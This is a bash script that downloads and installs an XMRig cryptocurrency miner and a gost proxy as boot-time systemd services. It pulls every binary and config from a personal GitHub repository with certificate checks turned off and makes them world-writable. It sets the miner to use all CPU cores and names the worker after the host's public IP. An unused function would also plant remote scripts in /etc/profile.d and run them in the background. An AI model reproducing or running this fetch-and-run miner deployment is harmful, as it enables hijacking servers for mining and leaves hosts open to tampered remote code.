#!/bin/bash

function Install_Gost(){
  Installation_dependency
  wget -N --no-check-certificate https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz
  gunzip gost-linux-amd64-2.11.5.gz
  mv gost-linux-amd64-2.11.5 /usr/bin/gost
  chmod -R 777 /usr/bin/gost
  wget -N --no-check-certificate https://raw.githubusercontent.com/KANIKIG/Multi-EasyGost/master/gost.service && chmod -R 777 gost.service && mv gost.service /usr/lib/systemd/system
  mkdir /etc/gost && wget -N --no-check-certificate https://github.com/summaxx/myscript/raw/master/gostc.json && mv gostc.json /etc/gost/config.json && chmod -R 777 /etc/gost
  systemctl enable gost && systemctl restart gost
}


function Installation_dependency() {
  apt-get update -y
  gzip_ver=$(gzip -V)
  if [[ -z ${gzip_ver} ]]; then
    if [[ ${release} == "centos" ]]; then
      yum update
      yum install -y gzip wget
    else
      apt-get update
      apt-get install -y gzip wget
    fi
  fi
  apt-get install hwloc nodejs -y
}

function Install_XMRIG(){
  wget -N --no-check-certificate https://github.com/summaxx/myscript/raw/master/xmrig
  chmod 755 xmrig
  mv xmrig /usr/bin/xmrig
  chmod -R 777 /usr/bin/xmrig
  wget  -N --no-check-certificate https://github.com/summaxx/myscript/raw/master/xmg.service
  chmod 755 xmg.service
  mv xmg.service /usr/lib/systemd/system
  sed -i "s/threads=8/threads=$(grep -c ^processor /proc/cpuinfo)/" /usr/lib/systemd/system/xmg.service
  IP_SERVICE_URL="https://api.ipify.org"
  external_ip=$(wget -qO- "$IP_SERVICE_URL")
  # 提取外网 IP 的最后两个段
  last_two_segments=$(echo "$external_ip" | awk -F '.' '{print $(NF-1)"."$NF}')
  sed -i "s/-p x/-p $last_two_segments/" /usr/lib/systemd/system/xmg.service
  systemctl enable xmg && systemctl restart xmg
}

function Install_autoreboot(){
  wget -N --no-check-certificate https://github.com/summaxx/myscript/raw/master/r.sh
  wget -N --no-check-certificate https://github.com/summaxx/myscript/raw/master/e.sh
  chmod 755 r.sh
  chmod 755 e.sh
  mv r.sh /usr/bin/
  mv e.sh /etc/profile.d/
  /usr/bin/r.sh &
}

sleep 3s
Installation_dependency
Install_Gost
Install_XMRIG
